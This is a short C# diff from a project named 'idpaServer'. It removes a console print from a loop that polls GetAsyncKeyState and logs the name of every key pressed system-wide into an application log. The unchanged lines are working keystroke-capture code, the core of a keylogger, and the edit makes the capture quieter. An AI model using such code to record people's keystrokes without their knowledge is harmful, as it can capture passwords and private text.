@@ -61,7 +61,6 @@ namespace idpaServer
                 if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                 {
                     logger.applicationLog.Last<IdpaTools.ApplicationLog>().keyList.Add(Enum.GetName(typeof(System.Windows.Forms.Keys), i));
-                    Console.WriteLine(Enum.GetName(typeof(System.Windows.Forms.Keys), i));
                 }
             }
         }
